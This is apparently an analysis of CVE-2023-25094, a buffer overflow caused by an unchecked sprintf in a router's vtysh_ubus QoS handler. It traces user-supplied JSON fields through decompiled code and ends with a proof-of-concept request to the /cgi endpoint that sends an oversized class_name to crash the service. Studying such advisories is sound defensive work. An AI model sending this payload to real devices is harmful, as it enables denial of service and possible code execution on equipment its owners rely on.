Based on the provided content, here's a breakdown of the vulnerability:

**Vulnerability Details for CVE-2023-25094**

*   **Root Cause:** The vulnerability stems from the use of `sprintf` with user-controlled data in the `into_class_node` function within the `vtysh_ubus` binary. This function is called by the `set_qos` function which is reached via the `qos_handler_set` entry point, leading to a buffer overflow because the size of the buffer used in sprintf is not checked.
*   **Weaknesses:**
    *   **Unsafe `sprintf` Usage:** The `sprintf` function is used to format a command string, but it doesn't perform bounds checking, making it vulnerable to buffer overflows when the input string exceeds the buffer's capacity.
    *   **User-Controlled Input:** The `class_name` and `old_class_name` parameters, which directly influence the string formatted by `sprintf`, are derived from user-provided JSON data, making them vulnerable to manipulation.
*   **Impact of Exploitation:** Successful exploitation of this vulnerability can lead to arbitrary code execution on the affected device.
*   **Attack Vector:** An attacker can send a specially crafted HTTP POST request containing malicious JSON data to the `/cgi` endpoint. This request will trigger the vulnerable `sprintf` call.
*   **Required Attacker Capabilities/Position:** The attacker needs high privileges to send HTTP requests that can trigger this vulnerability.

**Technical Details:**

The vulnerable code pattern is within the `into_class_node` function, which is called by the `set_qos` function, with the following code structure:
```c
if (is_upload == 0) {
	command_format_string = "no traffic download class %s";
  	}
  	else {
	command_format_string = "no traffic upload class %s";
  	}
  	sprintf(vtysh_command_buffer,command_format_string + 3,class_name);
```

The function is called with the user-controlled `class_name` or `old_class_name` variables depending on the values of the action parameter

```c
if (action != -1 && class_name != (char *)0x0) {
    if (action == 3) {
        [...]
}
else {
    if ((old_class_name == (char *)0x0) || (*old_class_name == '\0')) {
        into_class_node(is_upload,class_name);
    }
    else {
        into_class_node(is_upload,old_class_name);
    [...]
    }
    [...]
}
```

The values for `class_name` and `old_class_name` are fetched from the JSON via these calls:
```c
is_string = strcmp(table_key,"class_name");
if (is_string == 0) {
	class_name = (char *)blobmsg_get_string(table_value);
}
[...]
is_string = strcmp(table_key,"old_class_name");
if (is_string == 0) {
	old_class_name = (char *)blobmsg_get_string(table_value);
}
[...]
```

The `sprintf` function is used to construct a command that is passed to the `exec_no_return_debug` function. By providing a long string, it's possible to overflow the buffer allocated for the command.

The Proof of Concept provided in the report demonstrates how to trigger this vulnerability by sending a crafted JSON request to the `/cgi` endpoint that will cause the `vtysh_ubus` binary to crash, by providing a large string for the `class_name`.
```json
{
    "id": 9,
    "execute": 1,
    "core": "yruo_qos_download",
    "function": "set",
    "values": [
        {
            "base": "yruo_qos_upload",
            "index": 1,
            "value": {
                "class_list":[{
                    "class_name":'A'*0x300,
                    "action":2,
                }]
            }
        }
    ]
}
```
